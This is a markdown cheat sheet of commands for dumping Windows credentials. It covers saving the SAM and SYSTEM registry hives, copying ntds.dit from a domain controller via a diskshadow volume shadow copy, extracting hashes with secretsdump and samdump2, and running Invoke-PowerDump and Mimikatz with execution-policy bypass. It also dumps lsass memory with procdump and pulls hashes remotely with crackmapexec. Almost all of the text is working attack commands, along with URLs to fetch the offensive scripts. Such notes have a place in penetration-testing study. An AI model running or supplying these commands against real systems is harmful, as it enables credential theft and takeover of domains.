# Dump Hash

**Summery:**
- [Dump Hash](#dump-hash)
  - [Dump registery](#dump-registery)
    - [For AD - Get ntds.dit](#for-ad---get-ntdsdit)
  - [Powerdump](#powerdump)
  - [Mimikatz](#mimikatz)
  - [Dump lsass](#dump-lsass)
    - [Recover password (Attacker machine)](#recover-password-attacker-machine)
  - [crackmapexec](#crackmapexec)

## Dump registery 

> Dump registery

    reg save hklm\sam c:\sam
    reg save hklm\system c:\system

> Exctract hash

    samdump2 system sam

or 

    secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL

### For AD - Get ntds.dit

nano script.txt
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

diskshadow.exe /s script.txt

robocopy /B E:\Windows\ntds .\test ntds.dit

> Exctract hash

    secretsdump.py -system SYSTEM.hive -sam SAM.hive -ntds ntds.dit LOCAL

or 

    Mimikatz
    lsadump::sam /system:SYSTEM.hive /sam:SAM.hive -ntds ntds.dit

## Powerdump

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1

```powershell
powershell -ep bypass
Import-module .\Invoke-PowerDump.ps1
Invoke-PowerDump
```

## Mimikatz
> Source

    https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1


> Powershell

```powershell
powershell -ep bypass
Import-module .\Invoke-Mimikatz.ps1

Invoke-Mimikatz
Invoke-Mimikatz -DumpCerts
Invoke-Mimikatz -DumpCreds -ComputerName target1.example.org
```

> Binary

Mimikatz.exe

    privilege::debug
    token::elevate
    lsadump::sam

## Dump lsass
> Procdump
> 
    Procdump.exe -accepteula -ma lsass.exe  

> Psexec

FileURL: https://live.sysinternals.com/psexec.exe

> Dump lsass
> 
    psexec.exe -i -s lsass.exe

### Recover password (Attacker machine)

    Mimikatz "sekurlsa::minidump lsass.dmp"
    sekurlsa::LogonPasswords

## crackmapexec 

    cme smb IP_ADDRESS -u USERNAME -p PASSWORD --sam